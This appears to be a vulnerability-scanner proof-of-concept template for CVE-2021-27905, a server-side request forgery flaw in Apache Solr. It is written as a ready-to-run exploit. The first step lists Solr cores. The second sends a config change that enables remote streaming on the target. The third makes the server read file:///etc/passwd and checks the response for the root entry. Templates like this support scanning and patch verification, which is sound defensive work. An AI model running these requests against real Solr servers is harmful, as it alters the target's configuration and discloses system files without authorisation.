id: yaml-poc-apache-solr-ssrf-CVE-2021-27905
info:
  name: Yaml Poc Apache Solr Ssrf Cve 2021 27905
  author: lianjian.chen
  severity: high
  description: 'Converted from xpoc: yaml-poc-apache-solr-ssrf-CVE-2021-27905'
  tags: apache,ssrf,cve
  classification:
    cve-id: CVE-2021-27905
  reference:
  - https://help.aliyun.com/noticelist/articleid/1060828539.html
  - https://lists.apache.org/thread.html/r0ddc3a82bd7523b1453cb7a5e09eb5559517145425074a42eb326b10%40%3Cannounce.apache.org%3E
  - https://lists.apache.org/thread.html/r140128dc6bb4f4e0b6a39e962c7ca25a8cbc8e48ed766176c931fccc%40%3Cusers.solr.apache.org%3E
  - https://lists.apache.org/thread.html/r140128dc6bb4f4e0b6a39e962c7ca25a8cbc8e48ed766176c931fccc@%3Cusers.solr.apache.org%3E
  - https://lists.apache.org/thread.html/r3da74965aba2b5f5744b7289ad447306eeb2940c872801819faa9314%40%3Cusers.solr.apache.org%3E
http:
- method: GET
  path:
  - /solr/admin/cores?indexInfo=false&wt=json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - responseHeader
- method: POST
  path:
  - /solr/{{core}}/config
  body: '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

    '
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - responseHeader
- method: POST
  path:
  - /solr/{{core}}/debug/dump?param=ContentStreams
  body: 'stream.url=file:///etc/passwd

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
